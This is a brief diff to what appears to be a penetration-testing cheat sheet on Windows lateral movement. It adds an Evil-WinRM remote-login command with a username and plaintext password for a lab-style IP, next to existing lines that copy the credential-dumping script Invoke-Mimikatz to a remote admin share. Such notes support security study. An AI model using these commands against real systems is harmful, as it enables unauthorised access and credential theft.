@@ -293,7 +293,11 @@ If functions not on remote host:-
 ##### Copy File Across
 ```Copy-Item ./Invoke-Mimikatz.ps1 /Server1.local/c$/temp```
 ``` ls //Server1.local/c$/temp```
+* * *
+#### Evil WinRM
+Basically Powershell remoting possible from linux host:-
 
+```evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23```
 * * *
 
 #### PSExec and Impacket
